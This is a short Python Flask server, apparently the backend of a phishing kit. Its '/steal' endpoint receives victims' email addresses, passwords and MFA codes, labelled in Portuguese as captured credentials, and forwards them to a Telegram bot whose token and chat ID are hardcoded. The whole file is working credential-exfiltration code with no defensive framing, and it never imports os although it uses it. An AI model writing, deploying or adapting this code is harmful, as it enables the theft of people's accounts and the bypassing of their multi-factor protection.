from flask import Flask, request
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = '8680816826:AAG5SIB2efB56wwPm07646BKxvc-aWVTt9k'
CHAT_ID = '1192302498'

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    msg = (
        f"🎯 CREDENCIAIS CAPTURADAS\n"
        f"E-mail: {data.get('email')}\n"
        f"Senha: {data.get('password')}\n"
        f"MFA: {data.get('mfa_code') or 'não informado'}\n"
        f"Horário: {data.get('ts')}\n"
        f"Fonte: {data.get('source')}"
    )
    try:
        requests.post(
            f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
            json={'chat_id': CHAT_ID, 'text': msg},
            timeout=5
        )
    except Exception as e:
        print(f'Telegram error: {e}')
    return {'ok': True}

@app.route('/', methods=['GET'])
def health():
    return {'status': 'running', 'endpoint': '/steal'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
